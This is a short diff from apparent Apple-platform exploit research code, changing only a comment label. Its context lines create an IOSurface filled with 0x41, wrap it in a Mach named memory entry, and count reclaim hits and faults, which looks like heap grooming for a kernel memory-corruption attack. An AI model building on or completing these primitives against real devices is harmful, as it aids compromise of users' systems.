@@ -151,7 +151,7 @@ static int p084_safe_u32(volatile void *p, uint32_t *out) {
     int spread = p084_mass ? 0 : 2048;
     int p084_reclaimHits = 0;   /* C3 faults+changed, plus any Phase E release */
 
-    /* ---- IOSurface dlopen+dlsym (CSRaceCalib pattern: framework is not
+    /* ---- IOSurface dlopen+dlsym (LightSwordCalib pattern: framework is not
        loaded until something pulls it in — RTLD_DEFAULT alone fails) ---- */
     void *iosf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
     p084_surf_create_t surfCreate = (p084_surf_create_t)dlsym(iosf, "IOSurfaceCreate");
@@ -173,7 +173,7 @@ static int p084_safe_u32(volatile void *p, uint32_t *out) {
     memset(base, P084_FILL, 0x4000);
     L(@"[+] IOSurface 16KB created and filled 0x41");
 
-    /* ---- named memory entry over the surface base (CSRaceCalib pattern) ---- */
+    /* ---- named memory entry over the surface base (LightSwordCalib pattern) ---- */
     memory_object_size_t esz = 0x4000;
     mem_entry_name_port_t entry = 0;
     kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &esz,
